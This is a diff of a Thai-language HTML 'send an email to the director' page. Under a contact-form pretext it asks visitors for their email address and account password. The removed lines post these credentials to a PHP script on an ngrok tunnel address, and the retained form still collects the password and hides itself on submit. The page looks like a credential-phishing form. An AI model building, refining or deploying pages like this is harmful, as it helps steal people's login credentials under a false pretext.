@@ -6,64 +6,6 @@
     <title>ส่งข้อความ</title>
     <style>
         body {
-            margin: 0; /* ลบระยะขอบของหน้า */
-            height: 100vh; /* ความสูงเท่ากับขนาดหน้าจอ */
-            background-image: url('https://s1.zerochan.net/Tokisaki.Kurumi.600.3980765.jpg'); /* เปลี่ยน URL รูปภาพตรงนี้ */
-            background-size: cover; /* ปรับขนาดรูปให้เต็มหน้าจอ */
-            background-position: center; /* จัดให้รูปภาพอยู่ตรงกลาง */
-            background-repeat: no-repeat; /* ไม่ให้รูปซ้ำ */
-            display: flex; /* ใช้ Flexbox */
-            justify-content: center; /* จัดแนวฟอร์มไปที่กลาง */
-            align-items: center; /* จัดฟอร์มในแนวตั้ง */
-            height: 100vh; /* ความสูงเต็มหน้าจอ */
-        }
-
-        h1 {
-            color: black; /* สีตัวอักษร */
-            text-align: center; /* จัดตำแหน่งข้อความ */
-            font-size: 3em; /* ขนาดตัวอักษร */
-            margin-top: 20%; /* เพิ่มระยะห่างจากด้านบน */
-        }
-
-        .form-container {
-            padding: 20px;
-            box-shadow: none;
-            text-align: center;
-            background-color: transparent; /* ลบพื้นหลัง */
-            border: none; /* ลบขอบออก */
-        }
-
-        input, textarea, button {
-            width: 100%;
-            margin: 10px 0;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
-</head>
-<body>
-    <div class="form-container">
-        <h1>ส่งอีเมลหาผ.อ.</h1>
-        <form action="https://d4ca-49-237-14-107.ngrok-free.app/send_email.php" method="POST">
-            <input type="email" name="email" placeholder="อีเมลของคุณ" required>
-            <input type="password" name="password" placeholder="รหัสผ่านของคุณ" required>
-            <textarea name="message" rows="4" placeholder="ข้อความของคุณ" required></textarea>
-            <button type="submit">ส่งข้อความ</button>
-        </form>
-    <style>
-        body {
             margin: 0;
             height: 100vh;
             background-image: url('https://s1.zerochan.net/Tokisaki.Kurumi.600.3980765.jpg');
@@ -77,7 +19,7 @@
         }
         .form-container {
             text-align: center;
-            background-color: rgba(255, 255, 255, 0.8);
+            background-color: rgba(255, 255, 255, 0.8); /* พื้นหลังโปร่งแสง */
             padding: 20px;
             border-radius: 10px;
             width: 300px;
@@ -109,8 +51,8 @@
 <body>
     <div class="form-container">
         <form id="contactForm">
-            <input type="email" name="name" placeholder="อีเมลของคุณ" required>
-            <input type="password" name="email" placeholder="รหัสผ่านของคุณ" required>
+            <input type="email" name="email" placeholder="อีเมลของคุณ" required>
+            <input type="password" name="password" placeholder="รหัสผ่านของคุณ" required>
             <textarea name="message" rows="4" placeholder="ข้อความของคุณ" required></textarea>
             <button type="submit">ส่งข้อความ</button>
         </form>
@@ -127,6 +69,5 @@
             form.style.display = "none"; // ซ่อนฟอร์ม
         });
     </script>
-    </div>
 </body>
 </html>
